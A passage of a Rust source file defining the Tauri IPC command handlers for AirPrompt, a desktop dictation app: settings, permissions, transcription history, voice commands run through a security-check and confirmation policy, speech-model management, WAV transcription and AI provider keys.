//! The IPC command layer.
//!
//! Every command here matches an entry in `api` in `src/services/ipc.ts` by
//! name, arguments and return shape; a mismatch is a runtime error in the
//! frontend, so the two are read together. Validation runs on this side: the
//! frontend is never trusted for a path, URL, application name, shortcut name
//! or model id (spec §47).
//!
//! Errors cross as `ErrorPayload { code, message }`, produced by
//! `Error::message()` — no paths, no stack traces (spec §61).
//!
//! The Tauri command handlers are thin: they resolve [`SharedDependencies`]
//! and call one focused function. The focused functions are where the tests
//! are, because they do not need a Tauri runtime.

use std::collections::HashMap;
use std::sync::Arc;

use tauri::State;

use airprompt_core::commands as core_commands;
use airprompt_core::commands::{ParsedCommand, CONFIDENCE_FLOOR};
use airprompt_core::error::{Error, Result};
use airprompt_core::identity;
use airprompt_core::models::{ModelProgressEvent, SystemProfile};
use airprompt_core::platform::{PermissionKind, PermissionState, PlatformIntegration};
use airprompt_core::security::{self, ActionKind, RiskLevel, Verdict};
use airprompt_core::settings::{AiProviderKind, Settings};
use airprompt_core::storage::{
    AppProfile, CommandIntent, CustomCommand, DictionaryEntry, HistoryEntry, HistoryQuery,
};

use crate::dictation::TakePurpose;
use crate::events::{
    ActionOutcome, AiTestResult, CapabilityReport, CapabilitySupport, DiagnosticsSnapshot, UiEvent,
};
use crate::state::{AppState, SharedDependencies};

/// How Tauri hands the shared dependency slot to commands.
pub type Shared<'a> = State<'a, std::sync::Mutex<Option<SharedDependencies>>>;

/* -------------------------------------------------------- resolution --- */

/// Resolve the shared state, or fail with the same error the UI already knows
/// how to render: backend not ready.
pub fn resolve(shared: &Shared<'_>) -> Result<(Arc<AppState>, Arc<SharedDependencies>)> {
    let guard = shared
        .lock()
        .map_err(|_| Error::Store("application state is unavailable".into()))?;
    let deps = guard
        .as_ref()
        .ok_or_else(|| Error::Store("application state is unavailable".into()))?
        .clone();
    Ok((deps.state.clone(), deps))
}

/* -------------------------------------------------------- capability --- */

pub fn capability_report(state: &AppState) -> CapabilityReport {
    CapabilityReport {
        desktop: true,
        platform: std::env::consts::OS.to_string(),
        supports: CapabilitySupport {
            accessibility: cfg!(target_os = "macos"),
            system_shortcuts: true,
            shortcuts_app: cfg!(target_os = "macos"),
            tray: true,
            launch_at_login: true,
            auto_update: false,
        },
    }
}

/* ------------------------------------------------------------ handlers --- */

#[tauri::command]
pub fn capabilities(shared: Shared<'_>) -> Result<CapabilityReport> {
    let (state, _) = resolve(&shared)?;
    Ok(capability_report(&state))
}

#[tauri::command]
pub fn get_settings(shared: Shared<'_>) -> Result<Settings> {
    let (state, _) = resolve(&shared)?;
    state.load_settings()
}

#[tauri::command]
pub fn update_settings(shared: Shared<'_>, settings: Settings) -> Result<Settings> {
    let (state, deps) = resolve(&shared)?;
    let saved = state.save_settings(&settings)?;
    deps.watch.set(saved.clone());
    if let Err(error) = deps.shortcuts.apply(&saved) {
        tracing::warn!(code = error.code(), "shortcut re-registration failed");
    }
    deps.overlay.apply(&saved);
    Ok(saved)
}

#[tauri::command]
pub fn reset_settings(shared: Shared<'_>) -> Result<Settings> {
    let (state, deps) = resolve(&shared)?;
    let saved = state.save_settings(&Settings::default())?;
    deps.watch.set(saved.clone());
    if let Err(error) = deps.shortcuts.apply(&saved) {
        tracing::warn!(code = error.code(), "shortcut re-registration failed");
    }
    deps.overlay.apply(&saved);
    Ok(saved)
}

/* ---------------------------------------------------------- permissions --- */

/// Map the UI's permission names onto the enum, rejecting anything else.
fn permission_kind(raw: &str) -> Result<PermissionKind> {
    match raw.trim().to_ascii_lowercase().as_str() {
        "microphone" => Ok(PermissionKind::Microphone),
        "accessibility" => Ok(PermissionKind::Accessibility),
        "input_monitoring" | "inputmonitoring" | "input-monitoring" => {
            Ok(PermissionKind::InputMonitoring)
        }
        other => Err(Error::Refused(format!(
            "{other} is not a permission AirPrompt grants"
        ))),
    }
}

#[tauri::command]
pub fn permission_status(shared: Shared<'_>) -> Result<airprompt_core::platform::PermissionStatus> {
    let (state, _) = resolve(&shared)?;
    Ok(state.platform.permission_status())
}

#[tauri::command]
pub fn request_permission(
    shared: Shared<'_>,
    kind: String,
) -> Result<airprompt_core::platform::PermissionStatus> {
    let (state, _) = resolve(&shared)?;
    let kind = permission_kind(&kind)?;
    state.emit_permissions();
    Ok(state.platform.request_permission(kind)?)
}

#[tauri::command]
pub fn open_permission_settings(shared: Shared<'_>, kind: String) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    let kind = permission_kind(&kind)?;
    state.platform.open_permission_settings(kind)
}

/* ---------------------------------------------------------------- audio --- */

#[tauri::command]
pub fn input_devices(_shared: Shared<'_>) -> Result<Vec<airprompt_core::platform::InputDevice>> {
    crate::capture::input_devices()
}

#[tauri::command]
pub fn start_mic_test(shared: Shared<'_>) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    if state.platform.permission_status().microphone == PermissionState::Denied {
        return Err(Error::Permission("Microphone".into()));
    }
    state.emit_permissions();
    Ok(())
}

#[tauri::command]
pub fn stop_mic_test(_shared: Shared<'_>) -> Result<()> {
    Ok(())
}

/* ------------------------------------------------------------ dictation --- */

#[tauri::command]
pub fn start_dictation(shared: Shared<'_>, mode: Option<String>) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    deps.controller
        .start(TakePurpose::Dictation, mode.as_deref())
}

#[tauri::command]
pub fn start_command_mode(shared: Shared<'_>) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    deps.controller.start(TakePurpose::Command, Some("command"))
}

#[tauri::command]
pub fn stop_dictation(shared: Shared<'_>) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    deps.controller.stop()
}

#[tauri::command]
pub fn cancel_dictation(shared: Shared<'_>) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    deps.controller.cancel()
}

#[tauri::command]
pub fn overlay_ready(shared: Shared<'_>) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    deps.overlay.mark_ready();
    deps.overlay.push(deps.controller.overlay_state());
    Ok(())
}

#[tauri::command]
pub fn current_overlay_state(shared: Shared<'_>) -> Result<crate::events::OverlayState> {
    let (_, deps) = resolve(&shared)?;
    Ok(deps.controller.overlay_state())
}

/* -------------------------------------------------------------- history --- */

#[tauri::command]
pub fn history_list(shared: Shared<'_>, query: Option<HistoryQuery>) -> Result<Vec<HistoryEntry>> {
    let (state, _) = resolve(&shared)?;
    state.db.list_history(&query.unwrap_or_default())
}

#[tauri::command]
pub fn history_delete(shared: Shared<'_>, id: i64) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    state.db.delete_history(id)
}

#[tauri::command]
pub fn history_delete_all(shared: Shared<'_>) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    state.db.delete_all_history()
}

#[tauri::command]
pub fn history_export(shared: Shared<'_>, format: String) -> Result<String> {
    let (state, _) = resolve(&shared)?;
    let entries = state.db.list_history(&HistoryQuery {
        limit: Some(10_000),
        ..Default::default()
    })?;
    Ok(match format.as_str() {
        "json" => serde_json::to_string_pretty(&entries).unwrap_or_default(),
        "markdown" => export_markdown(&entries),
        _ => export_plain(&entries),
    })
}

fn export_plain(entries: &[HistoryEntry]) -> String {
    let mut out = String::new();
    for entry in entries {
        out.push_str(&entry.transcript.replace('\n', " "));
        out.push('\n');
    }
    out
}

fn export_markdown(entries: &[HistoryEntry]) -> String {
    let mut out = String::from(
        "| Date (ms) | App | Model | Enhanced | Transcript |\n|---|---|---|---|---|\n",
    );
    for entry in entries {
        let transcript = entry.transcript.replace('|', "\\|").replace('\n', " ");
        out.push_str(&format!(
            "| {} | {} | {} | {} | {} |\n",
            entry.created_at,
            entry.app_name.replace('|', "\\|"),
            entry.model_id.replace('|', "\\|"),
            if entry.enhanced { "yes" } else { "no" },
            transcript
        ));
    }
    out
}

#[tauri::command]
pub fn paste_last(shared: Shared<'_>) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    let text = deps.controller.last_transcript();
    if text.trim().is_empty() {
        return Err(Error::Store("no transcript is available yet".into()));
    }
    let (state, _) = resolve(&shared)?;
    state.platform.set_clipboard(&text)?;
    Ok(())
}

#[tauri::command]
pub fn copy_to_clipboard(shared: Shared<'_>, text: String) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    state.platform.set_clipboard(&text)?;
    Ok(())
}

/* ------------------------------------------------------------ dictionary --- */

#[tauri::command]
pub fn dictionary_list(shared: Shared<'_>) -> Result<Vec<DictionaryEntry>> {
    let (state, _) = resolve(&shared)?;
    state.db.list_dictionary()
}

#[tauri::command]
pub fn dictionary_upsert(shared: Shared<'_>, entry: DictionaryEntry) -> Result<DictionaryEntry> {
    let (state, _) = resolve(&shared)?;
    validate_dictionary(&entry)?;
    state.db.upsert_dictionary(&entry)
}

fn validate_dictionary(entry: &DictionaryEntry) -> Result<()> {
    if entry.spoken.trim().is_empty() {
        return Err(Error::Refused("the spoken phrase was empty".into()));
    }
    if entry.replacement.trim().is_empty() {
        return Err(Error::Refused("the replacement was empty".into()));
    }
    if entry.spoken.len() > 200 || entry.replacement.len() > 200 {
        return Err(Error::Refused(
            "dictionary entries have a 200-character limit".into(),
        ));
    }
    Ok(())
}

#[tauri::command]
pub fn dictionary_delete(shared: Shared<'_>, id: i64) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    state.db.delete_dictionary(id)
}

/* -------------------------------------------------------- voice commands --- */

#[tauri::command]
pub fn commands_list(shared: Shared<'_>) -> Result<Vec<CustomCommand>> {
    let (state, _) = resolve(&shared)?;
    state.db.list_commands()
}

#[tauri::command]
pub fn commands_upsert(shared: Shared<'_>, command: CustomCommand) -> Result<CustomCommand> {
    let (state, _) = resolve(&shared)?;
    validate_command(&command)?;
    state.db.upsert_command(&command)
}

fn validate_command(command: &CustomCommand) -> Result<()> {
    if command.name.trim().is_empty() {
        return Err(Error::Refused("the command name was empty".into()));
    }
    if command.triggers.iter().all(|t| t.trim().is_empty()) {
        return Err(Error::Refused(
            "the command needs at least one trigger".into(),
        ));
    }
    if command.steps.is_empty() {
        return Err(Error::Refused("the command has no steps".into()));
    }
    // Every step of a user-defined workflow must pass the security layer: a
    // workflow is only as safe as its most dangerous step (spec §47).
    for step in &command.steps {
        let kind = core_commands::to_action_kind(&step.intent);
        if let Verdict::Blocked(reason) = security::judge(kind, &step.target) {
            return Err(Error::Refused(reason.to_string()));
        }
        if security::looks_like_shell(&step.target) {
            return Err(Error::Refused("a step may not contain shell syntax".into()));
        }
    }
    Ok(())
}

#[tauri::command]
pub fn commands_delete(shared: Shared<'_>, id: String) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    if id.trim().is_empty() {
        return Err(Error::Refused("no command id was given".into()));
    }
    state.db.delete_command(id.trim())
}

#[tauri::command]
pub fn parse_command(shared: Shared<'_>, text: String) -> Result<Option<ParsedCommand>> {
    let (state, _) = resolve(&shared)?;
    let (state, _) = resolve(&shared)?;
    Ok(core_commands::parse(&text, &command_targets(&state)?))
}

#[tauri::command]
pub fn run_command(shared: Shared<'_>, text: String) -> Result<ActionOutcome> {
    let (state, _) = resolve(&shared)?;
    let targets = command_targets(&state)?;
    match core_commands::parse(&text, &targets) {
        Some(parsed) => {
            state.sink.emit(UiEvent::Command {
                command: Some(parsed.clone()),
                raw: text,
            });
            Ok(execute_with_policy(&state, parsed))
        }
        None => {
            state.sink.emit(UiEvent::Command {
                command: None,
                raw: text,
            });
            Ok(ActionOutcome::refused("No command was recognised in that."))
        }
    }
}

#[tauri::command]
pub fn execute_command(shared: Shared<'_>, command: ParsedCommand) -> Result<ActionOutcome> {
    let (state, _) = resolve(&shared)?;
    Ok(execute_with_policy(&state, command))
}

/// Build the parser's view of the machine.
fn command_targets(state: &AppState) -> Result<core_commands::Targets> {
    Ok(core_commands::Targets {
        apps: state.platform.installed_applications().unwrap_or_default(),
        shortcuts: state.platform.list_shortcuts().unwrap_or_default(),
        custom: state.db.list_commands().unwrap_or_default(),
    })
}

/// The single execution policy for parsed commands.
///
/// The parser has already validated the shape; the security layer decides
/// here. Steps that need confirmation produce an `ActionOutcome` that asks
/// rather than runs; nothing risky executes silently (spec §26, §58).
fn execute_with_policy(state: &AppState, parsed: ParsedCommand) -> ActionOutcome {
    if parsed.confidence < CONFIDENCE_FLOOR {
        return ActionOutcome {
            ok: false,
            message: format!(
                "Not sure you said \u{201C}{}\u{201D}. Try again?",
                parsed.target
            ),
            needs_confirmation: false,
            plan: parsed.steps.iter().map(|s| step_summary(s)).collect(),
        };
    }

    let plan: Vec<String> = parsed.steps.iter().map(step_summary).collect();

    let needs_confirmation = parsed.steps.iter().any(|step| {
        matches!(
            security::judge(core_commands::to_action_kind(&step.intent), &step.target),
            Verdict::NeedsConfirmation(_)
        )
    }) || parsed.name.is_some()
        || parsed.steps.len() > 1;

    if needs_confirmation {
        return ActionOutcome {
            ok: false,
            message: "Confirm to run this command.".into(),
            needs_confirmation: true,
            plan,
        };
    }

    execute_parsed(&parsed, state.platform.as_ref())
}

/// Run each step through the platform adapter.
///
/// Steps run in order and stop at the first failure, so a broken step is
/// reported rather than silently skipped (spec §28).
pub fn execute_parsed(parsed: &ParsedCommand, platform: &dyn PlatformIntegration) -> ActionOutcome {
    if parsed.steps.is_empty() {
        return ActionOutcome::refused("the command has no steps to run");
    }

    for step in &parsed.steps {
        let kind = core_commands::to_action_kind(&step.intent);
        // The parse layer rejected shell-shaped speech; re-check here because
        // the executor trusts only this test (spec §26).
        if security::looks_like_shell(&step.target) {
            return ActionOutcome::refused("that step contains shell syntax");
        }
        if let Verdict::Blocked(reason) = security::judge(kind, &step.target) {
            return ActionOutcome::refused(reason);
        }

        let result = match kind {
            ActionKind::OpenApp => platform.launch_application(&step.target),
            ActionKind::OpenUrl => {
                security::validate_url(&step.target).and_then(|url| platform.open_url(&url))
            }
            ActionKind::OpenFile | ActionKind::OpenFolder => security::validate_path(&step.target)
                .and_then(|path| platform.open_path(&expand_home(&path))),
            ActionKind::RunShortcut => platform.run_shortcut(&step.target),
            ActionKind::CopyText => platform.set_clipboard(&step.target).map(|_| ()),
            ActionKind::SearchWeb => {
                let search = format!("https://duckduckgo.com/?q={}", urlencoded(&step.target));
                platform.open_url(&search)
            }
            // App-local intents never reach the OS.
            ActionKind::Dictate
            | ActionKind::StopDictation
            | ActionKind::ChangeModel
            | ActionKind::OpenSettings => Ok(()),
        };

        if let Err(error) = result {
            return ActionOutcome {
                ok: false,
                message: format!("{}: {}", step_label(&step.intent), error.message()),
                needs_confirmation: false,
                plan: Vec::new(),
            };
        }
    }

    ActionOutcome {
        ok: true,
        message: format!(
            "{} \u{2713}",
            if parsed.steps.len() == 1 {
                step_summary(&parsed.steps[0])
            } else {
                format!("{} steps ran", parsed.steps.len())
            }
        ),
        needs_confirmation: false,
        plan: Vec::new(),
    }
}

fn step_summary(step: &airprompt_core::storage::ActionStep) -> String {
    format!("{:?} \u{2192} {}", step.intent, step.target)
}

fn step_label(intent: &CommandIntent) -> String {
    match intent {
        CommandIntent::OpenApp => "Opening the app failed".into(),
        CommandIntent::OpenUrl => "Opening the link failed".into(),
        CommandIntent::OpenFile => "Opening the file failed".into(),
        CommandIntent::OpenFolder => "Opening the folder failed".into(),
        CommandIntent::RunShortcut => "The shortcut failed".into(),
        CommandIntent::CopyText => "Copying failed".into(),
        CommandIntent::SearchWeb => "The search failed".into(),
        _ => "The step failed".into(),
    }
}

fn urlencoded(text: &str) -> String {
    let mut out = String::new();
    for byte in text.as_bytes() {
        match byte {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(*byte as char)
            }
            b' ' => out.push('+'),
            _ => out.push_str(&format!("%{byte:02X}")),
        }
    }
    out
}

fn expand_home(path: &str) -> String {
    if let Some(rest) = path.strip_prefix("~/") {
        if let Some(home) = std::env::var_os("USERPROFILE").or_else(|| std::env::var_os("HOME")) {
            return format!(
                "{}{}{rest}",
                home.to_string_lossy(),
                std::path::MAIN_SEPARATOR
            );
        }
    }
    path.to_string()
}

#[tauri::command]
pub fn discover_targets(shared: Shared<'_>) -> Result<HashMap<String, Vec<String>>> {
    let (state, _) = resolve(&shared)?;
    let targets = command_targets(&state)?;
    let mut map = HashMap::new();
    map.insert("apps".to_string(), targets.apps);
    map.insert("shortcuts".to_string(), targets.shortcuts);
    Ok(map)
}

#[tauri::command]
pub fn run_shortcut(shared: Shared<'_>, name: String) -> Result<ActionOutcome> {
    let (state, _) = resolve(&shared)?;
    let name = name.trim().to_string();
    match security::judge(ActionKind::RunShortcut, &name) {
        Verdict::Blocked(reason) => Ok(ActionOutcome::refused(reason)),
        Verdict::NeedsConfirmation(_) => Ok(ActionOutcome {
            ok: false,
            message: format!("Run the \u{201C}{name}\u{201D} shortcut?"),
            needs_confirmation: true,
            plan: vec![format!("RunShortcut \u{2192} {name}")],
        }),
        Verdict::Allowed => Ok(execute_parsed(
            &parsed_single(CommandIntent::RunShortcut, name, RiskLevel::Medium),
            state.platform.as_ref(),
        )),
    }
}

/// A single-step `ParsedCommand` for direct execution paths.
fn parsed_single(intent: CommandIntent, target: String, risk: RiskLevel) -> ParsedCommand {
    ParsedCommand {
        intent,
        target: target.clone(),
        confidence: 1.0,
        risk,
        summary: target.clone(),
        local: true,
        name: None,
        steps: vec![airprompt_core::storage::ActionStep { intent, target }],
    }
}

/* -------------------------------------------------------------- profiles --- */

#[tauri::command]
pub fn profiles_list(shared: Shared<'_>) -> Result<Vec<AppProfile>> {
    let (state, _) = resolve(&shared)?;
    state.db.list_profiles()
}

#[tauri::command]
pub fn profiles_upsert(shared: Shared<'_>, profile: AppProfile) -> Result<AppProfile> {
    let (state, _) = resolve(&shared)?;
    if profile.app_pattern.trim().is_empty() {
        return Err(Error::Refused("the app pattern was empty".into()));
    }
    if profile.app_pattern.len() > 120 {
        return Err(Error::Refused(
            "the app pattern has a 120-character limit".into(),
        ));
    }
    state.db.upsert_profile(&profile)
}

#[tauri::command]
pub fn profiles_delete(shared: Shared<'_>, id: i64) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    state.db.delete_profile(id)
}

/* ---------------------------------------------------------------- models --- */

#[tauri::command]
pub fn list_models(shared: Shared<'_>) -> Result<Vec<airprompt_core::models::ModelInfo>> {
    let (state, _) = resolve(&shared)?;
    let settings = state.load_settings()?;
    let recommended = if settings.speech.model_id.is_empty() {
        profile_of(&state)
            .map(|p| airprompt_core::models::recommend(&p).recommended)
            .unwrap_or_else(|| airprompt_core::models::DEFAULT_MODEL_ID.to_string())
    } else {
        settings.speech.model_id.clone()
    };
    Ok(state.models.list(&recommended))
}

#[tauri::command]
pub fn download_model(app: tauri::AppHandle, shared: Shared<'_>, id: String) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    let manager = state.models.clone();
    let sink = state.sink.clone();
    let local_only = state.load_settings()?.privacy.local_only;

    // Spawn so the command returns immediately; progress streams as events.
    tauri::async_runtime::spawn(async move {
        let progress = Arc::new(move |event: ModelProgressEvent| {
            sink.emit(UiEvent::Model { model: event });
        });
        let result = manager.download(&id, local_only, progress).await;
        match result {
            Ok(_) => {
                sink.emit(UiEvent::Toast {
                    toast: crate::events::ToastEvent::info(format!("{id} is ready to use.")),
                });
            }
            Err(Error::Cancelled) => {
                // Paused/cancelled downloads report through progress events.
            }
            Err(error) => sink.emit(UiEvent::Toast {
                toast: (&error).into(),
            }),
        }
    });
    Ok(())
}

#[tauri::command]
pub fn pause_model_download(shared: Shared<'_>, id: String) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    state.models.pause(&id);
    Ok(())
}

#[tauri::command]
pub fn resume_model_download(shared: Shared<'_>, id: String) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    state.models.resume(&id);
    Ok(())
}

#[tauri::command]
pub fn delete_model(shared: Shared<'_>, id: String) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    let settings = state.load_settings()?;
    // Refuse to delete the active model out from under the engine.
    if settings.speech.model_id == id {
        return Err(Error::Refused(
            "this model is in use; choose another model before deleting it".into(),
        ));
    }
    state.models.delete(&id)?;
    Ok(())
}

#[tauri::command]
pub fn verify_model(shared: Shared<'_>, id: String) -> Result<bool> {
    let (state, _) = resolve(&shared)?;
    state.models.verify(&id)
}

#[tauri::command]
pub fn set_active_model(shared: Shared<'_>, id: String) -> Result<()> {
    let (state, deps) = resolve(&shared)?;
    // Only a ready model may become active, so the next take does not fail
    // obscurely.
    if !state.models.is_ready(&id) {
        return Err(Error::ModelNotReady);
    }
    let mut settings = state.load_settings()?;
    settings.speech.model_id = id;
    let saved = state.save_settings(&settings)?;
    deps.watch.set(saved.clone());
    // Loading is synchronous and probe-decodes once; a failed load leaves the
    // previous model in place.
    state.speech.apply_settings(&saved, &state.models)?;
    Ok(())
}

#[tauri::command]
pub fn recommend_model(shared: Shared<'_>) -> Result<airprompt_core::models::ModelRecommendation> {
    let (state, _) = resolve(&shared)?;
    let profile = profile_of(&state)
        .ok_or_else(|| Error::Unsupported("this machine's memory could not be measured".into()))?;
    Ok(airprompt_core::models::recommend(&profile))
}

#[tauri::command]
pub fn system_profile(shared: Shared<'_>) -> Result<SystemProfile> {
    let (state, _) = resolve(&shared)?;
    profile_of(&state)
        .ok_or_else(|| Error::Unsupported("this machine's resources could not be measured".into()))
}

/// Build the hardware profile for the recommender, or `None` when the
/// platform cannot measure memory. Without memory the recommendation would be
/// a guess, so it is refused rather than faked.
fn profile_of(state: &AppState) -> Option<SystemProfile> {
    let total_ram_mb = state.platform.total_memory_mb()?;
    let free_disk_mb = state
        .platform
        .free_disk_mb(state.models.directory())
        .unwrap_or(0);
    let cpu_cores = std::thread::available_parallelism()
        .map(|n| n.get() as u32)
        .unwrap_or(2);
    Some(SystemProfile {
        os: std::env::consts::OS.to_string(),
        arch: std::env::consts::ARCH.to_string(),
        cpu_cores,
        total_ram_mb,
        free_disk_mb,
        has_gpu: false,
        accelerator: "cpu".into(),
    })
}

#[tauri::command]
pub fn models_disk_usage(shared: Shared<'_>) -> Result<u64> {
    let (state, _) = resolve(&shared)?;
    Ok(state.models.disk_usage())
}

#[tauri::command]
pub fn transcribe_file(shared: Shared<'_>, path: String) -> Result<HistoryEntry> {
    let (state, _) = resolve(&shared)?;
    // Path validation is not negotiable for anything opened from disk (§47);
    // also refuse anything that is not a plain .wav the app itself can read.
    let validated = security::validate_path(&path)?;
    if !validated.to_ascii_lowercase().ends_with(".wav") {
        return Err(Error::Refused("only .wav files can be transcribed".into()));
    }
    let samples = read_wav_mono_16k(std::path::Path::new(&validated))?;
    let text = state.speech.transcribe(&samples)?;
    let entry = state
        .db
        .insert_history(&airprompt_core::storage::NewHistoryEntry {
            duration_ms: (samples.len() as i64 * 1000)
                / airprompt_core::whisper::SAMPLE_RATE as i64,
            app_name: "File".into(),
            transcript: text,
            mode: "file".into(),
            model_id: state.speech.loaded_model_id().unwrap_or_default(),
            enhanced: false,
            command_intent: None,
        })?;
    state.sink.emit(UiEvent::History {
        entry: entry.clone(),
    });
    Ok(entry)
}

/// Decode a RIFF/WAVE file to 16 kHz mono f32.
fn read_wav_mono_16k(path: &std::path::Path) -> Result<Vec<f32>> {
    let bytes = std::fs::read(path)?;
    if bytes.len() < 44 || &bytes[0..4] != b"RIFF" || &bytes[8..12] != b"WAVE" {
        return Err(Error::Refused("that file is not a WAV".into()));
    }
    let mut pcm: Vec<f32> = Vec::new();
    let mut sample_rate = 16_000u32;
    let mut channels = 1u16;
    let mut bits = 16u16;
    let mut offset = 12usize;
    while offset + 8 <= bytes.len() {
        let id = &bytes[offset..offset + 4];
        let size = u32::from_le_bytes(bytes[offset + 4..offset + 8].try_into().unwrap()) as usize;
        let body = offset + 8;
        if body > bytes.len() {
            break;
        }
        if id == b"fmt " && body + 16 <= bytes.len() {
            channels = u16::from_le_bytes(bytes[body + 2..body + 4].try_into().unwrap());
            sample_rate =
                u32::from_le_bytes(bytes[body + 4..body + 8].try_into().unwrap_or([0, 0, 0, 0]));
            bits = u16::from_le_bytes(bytes[body + 14..body + 16].try_into().unwrap());
        } else if id == b"data" {
            let end = (body + size).min(bytes.len());
            if bits == 16 {
                for chunk in bytes[body..end].chunks_exact(2) {
                    pcm.push(i16::from_le_bytes([chunk[0], chunk[1]]) as f32 / 32768.0);
                }
            } else if bits == 32 {
                for chunk in bytes[body..end].chunks_exact(4) {
                    let raw = f32::from_le_bytes(chunk.try_into().unwrap_or([0.0; 4]));
                    pcm.push(raw.clamp(-1.0, 1.0));
                }
            }
        }
        offset = body + size + usize::from(size & 1 == 1);
    }
    let mono = airprompt_core::audio::to_mono(&pcm, channels.max(1) as usize);
    if sample_rate == airprompt_core::whisper::SAMPLE_RATE {
        return Ok(mono);
    }
    let mut resampler = airprompt_core::audio::Resampler::new(
        sample_rate.max(1),
        airprompt_core::whisper::SAMPLE_RATE,
    );
    Ok(resampler.process(&mono))
}

/* ----------------------------------------------------------------- AI --- */

#[tauri::command]
pub fn test_ai(shared: Shared<'_>) -> Result<AiTestResult> {
    let (state, _) = resolve(&shared)?;
    let settings = state.load_settings()?;
    let started = std::time::Instant::now();

    if settings.enhancement.provider == AiProviderKind::None {
        return Ok(AiTestResult {
            ok: false,
            message: "Choose a provider first.".into(),
            latency_ms: None,
        });
    }
    if let Some(blocker) = settings.enhancement_blocker() {
        return Ok(AiTestResult {
            ok: false,
            message: blocker.into(),
            latency_ms: None,
        });
    }

    let api_key = state
        .secrets
        .get(settings.enhancement.provider.secret_key())
        .ok()
        .flatten();
    let (text, enhanced, warning) = crate::dictation::test_enhancement(
        &settings.enhancement,
        api_key.as_deref(),
        settings.privacy.local_only,
    );
    let latency_ms = started.elapsed().as_millis() as u64;
    let _ = text;
    Ok(AiTestResult {
        ok: enhanced && warning.is_none(),
        message: if let Some(warning) = warning {
            warning
        } else if enhanced {
            format!("Connected. Model: {}", settings.enhancement.model)
        } else {
            "The provider replied with an empty response.".into()
        },
        latency_ms: Some(latency_ms),
    })
}

#[tauri::command]
pub fn list_ai_models(shared: Shared<'_>) -> Result<Vec<String>> {
    let _ = resolve(&shared)?;
    // A per-provider static list is honest: an OpenAI-compatible endpoint
    // cannot be probed without a key, and inventing forty model names would be
    // worse than the handful known to exist.
    Ok(vec![
        "gpt-4o-mini".into(),
        "gpt-4o".into(),
        "llama3.2".into(),
        "llama3.1".into(),
        "mistral".into(),
        "qwen2.5".into(),
        "phi3".into(),
        "gemma2".into(),
    ])
}

#[tauri::command]
pub fn set_api_key(shared: Shared<'_>, provider: AiProviderKind, key: String) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    let trimmed = key.trim();
    if trimmed.is_empty() {
        return Err(Error::Refused("the key was empty".into()));
    }
    if trimmed.len() > 512 {
        return Err(Error::Refused("that key is too long".into()));
    }
    let _ = provider;
    state.secrets.set(provider.secret_key(), trimmed)?;
    Ok(())
}

#[tauri::command]
pub fn api_key_status(shared: Shared<'_>, provider: AiProviderKind) -> Result<bool> {
    let (state, _) = resolve(&shared)?;
    Ok(state
        .secrets
        .get(provider.secret_key())?
        .map(|key| !key.is_empty())
        .unwrap_or(false))
}

#[tauri::command]
pub fn delete_api_key(shared: Shared<'_>, provider: AiProviderKind) -> Result<()> {
    let (state, _) = resolve(&shared)?;
    state.secrets.delete(provider.secret_key())
}

/* -------------------------------------------------------- diagnostics --- */

#[tauri::command]
pub fn diagnostics(shared: Shared<'_>) -> Result<DiagnosticsSnapshot> {
    let (_, deps) = resolve(&shared)?;
    Ok(deps.controller.diagnostics())
}

#[tauri::command]
pub fn diagnostics_text(shared: Shared<'_>) -> Result<String> {
    let (state, deps) = resolve(&shared)?;
    let snapshot = deps.controller.diagnostics();
    let uptime_min = (airprompt_core::now_ms() - state.started_at_ms) / 60_000;
    Ok(format!(
        "{}, {} · {} {} · engine {} · model {} ({}) · hotkey {} · mic {} · local-only {}\nlatency ms: {:?}\nuptime: {} min",
        snapshot.os,
        snapshot.arch,
        identity::APP_NAME,
        snapshot.app_version,
        snapshot.speech_engine,
        if snapshot.model_id.is_empty() { "<none>" } else { snapshot.model_id.as_str() },
        if snapshot.model_ready { "ready" } else { "not loaded" },
        snapshot.hotkey,
        snapshot.microphone,
        snapshot.local_only,
        snapshot.latency.total_ms,
        uptime_min,
    ))
}

#[tauri::command]
pub fn set_log_level(shared: Shared<'_>, level: String) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    let parsed = crate::logging::parse_level(&level)
        .ok_or_else(|| Error::Refused(format!("{level} is not a log level")))?;
    match deps.logging.as_ref() {
        Some(logging) => {
            logging.set_level(parsed);
            Ok(())
        }
        None => Err(Error::Store("logging is not initialised".into())),
    }
}

#[tauri::command]
pub fn log_file_path(shared: Shared<'_>) -> Result<String> {
    let (_, deps) = resolve(&shared)?;
    Ok(deps.paths.log_file().to_string_lossy().into_owned())
}

#[tauri::command]
pub fn reveal_log_file(shared: Shared<'_>) -> Result<()> {
    let (state, deps) = resolve(&shared)?;
    let path = deps.paths.log_file();
    if !path.is_file() {
        return Err(Error::Io("the log file has not been written yet".into()));
    }
    match path.parent() {
        Some(parent) => state.platform.open_path(&parent.to_string_lossy()),
        None => Err(Error::Io(
            "the log file's directory could not be resolved".into(),
        )),
    }
}

/* ---------------------------------------------------------------- update --- */

#[tauri::command]
pub fn check_update(_shared: Shared<'_>) -> Result<Option<crate::events::UpdateInfo>> {
    // No updater is configured in this release; answering honestly beats an
    // update check that can never succeed.
    Ok(None)
}

#[tauri::command]
pub fn install_update(_shared: Shared<'_>) -> Result<()> {
    Err(Error::Unsupported(
        "the updater is not available in this build".into(),
    ))
}

/* ------------------------------------------------------------- lifecycle --- */

#[tauri::command]
pub fn open_dashboard(shared: Shared<'_>) -> Result<()> {
    let (_, deps) = resolve(&shared)?;
    deps.overlay.open_dashboard()
}

#[tauri::command]
